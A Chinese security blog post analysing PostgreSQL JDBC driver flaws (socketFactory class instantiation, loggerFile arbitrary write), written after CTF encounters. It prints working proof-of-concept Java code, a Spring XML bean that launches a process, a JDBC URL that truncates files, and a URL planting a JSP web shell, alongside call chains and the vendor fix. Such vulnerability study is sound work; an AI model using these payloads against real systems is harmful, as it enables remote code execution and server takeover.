---
layout: post
title: PostGrasql
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---

 

## 前言

```java
在冀信杯中就看到过这个漏洞，当时只是利用没看原理，直接打的远程xml命令执行，在后来的安洵杯也遇到了，只不过用的是另外的任意文件写入，特别来跟一下流程。
```

```java
JDBC java数据库连接，是Java语言中用来规范客户端如何访问数据库的应用程序接口，具体讲就是通过Java连接广泛数据库，并对表中数据执行增、删、改、查等操作的技术。
当程序中 JDBC 连接 URL 可控时，可能会造成安全问题。比较具有代表性的就是 JDBC 反序列化漏洞，是在于 mysql 数据库连接时产生的
```

​	

## 任意代码执行 socketFactory/socketFactoryArg

​	影响范围：

- REL9.4.1208 <= PostgreSQL <42.2.25
- 42.3.0 <= PostgreSQL < 42.3.2

这个漏洞主要产生的原因是，`org.postgresql.util.ObjectFactory` 里面调用了`instantiate` 方法

![image-20231224205642825](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224205642825.png)

大概意思就是对classname类名的String构造方法，赋值stringarg并进行初始化

`任意执行某个类的string构造方法`，因此只要找到一个符合这样条件的类即可

![image-20231224205955928](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224205955928.png)

传入的参数都是通过 `Properties info`来获得的，所以能直接反射修改:

#### 调用链子

```java
instantiate:62, ObjectFactory (org.postgresql.util)
getSocketFactory:39, SocketFactoryFactory (org.postgresql.core)
openConnectionImpl:184, ConnectionFactoryImpl (org.postgresql.core.v3)
openConnection:51, ConnectionFactory (org.postgresql.core)
<init>:225, PgConnection (org.postgresql.jdbc)
makeConnection:466, Driver (org.postgresql)
connect:265, Driver (org.postgresql)
getConnection:664, DriverManager (java.sql)
getConnection:270, DriverManager (java.sql)
```

### 漏洞利用

通过加载远程恶意XML实现RCE，先看一个案例

```java
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class cve2022 {
    public static void main(String[] args) throws SQLException, SQLException {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:9999/poc.xml";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    普通方式创建类-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
           
            <value>calc.exe</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

![image-20231224212159159](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224212159159.png)

关键的地方在`org.postgresql.Driver#connect` ,这里通过parseURL对传入的url进行了解析存入了prpos也就是info中

![image-20231224213235810](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224213235810.png)

进入导致传入`ObjectFactory ` 的形参都是可控的，这里初始化的是

`org.springframework.context.support.ClassPathXmlApplicationContext`

![image-20231224213416888](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224213416888.png)

![image-20231224213602623](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224213602623.png)

这两个类都可以执行xml代码

![image-20231224220156639](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224220156639.png)

```java
是通过远程加载 bean 配置文件，利用初始化 ProcessImpl 类的 bean 的过程，将任意字符串作为命令行执行内容注入，达到任意命令行命令执行的效果,也就是远程加载xml文件进行解析。
```

#### 调用链子

![image-20231224220724248](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224220724248.png)

## 清空指定的任意文件

```java
 jdbcUrl="jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=java.io.FileOutputStream&socketFactoryArg=test.txt";
```

就可以把任意的test文件进行清空，其实还是利用了实例化类的初始化参数

```java
FileOutputStream fileOutputStream=new FileOutputStream("test.txt");
```

偷张图，这个 图描述的非常直观

![image-20231226174331297](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226174331297.png)

## 任意文件写入 loggerLevel/loggerFile

影响范围：

- 42.1.0 <= PostgreSQL <42.3.3

执行的命令

```java
jdbcUrl="jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=DEBUG&loggerFile=./test.jsp&<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>\n";
```

![image-20231226174857263](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226174857263.png)

在`setupLoggerFromProperties `中设置日志的一些前提要求，这里props是数组解析我们传入的参数，首先 获得LOGGER_LEVEL不为空，否则进不去执行语句

![image-20231226180337611](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226180337611.png)

然后`driverLogFile`获得存储日志的位置

![image-20231226180508526](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226180508526.png)

最后进入关键的LOGGER.log方法进行存储

![image-20231226180552229](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226180552229.png)

学过jsp的应该知道，jsp会执行<%%>当作java片段，前面的不会影响的

![image-20231226180658595](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226180658595.png)

犹豫对路径没有一点的过滤，所以可以跨目录进行生成

```java
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class cve202221724 {
    public static void main(String[] args) throws SQLException {
        String loggerLevel = "debug";
        String loggerFile = "test.txt";
        String shellContent="test";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+ "&"+shellContent;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```

和任意代码执行的出口不一样

![image-20231226180806337](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226180806337.png)

## 在高版本中对这些现象进行了修复

高版本规定了，反射的类，必须是javax.net.SocketFactory的子类，否则就抛出异常

![image-20231226181352838](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226181352838.png)

对比一下发现把this.setupLoggerFromProperties(props);删除掉了（也就是说不能指定存储文件的位置了）

![image-20231226181804490](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231226181804490.png)
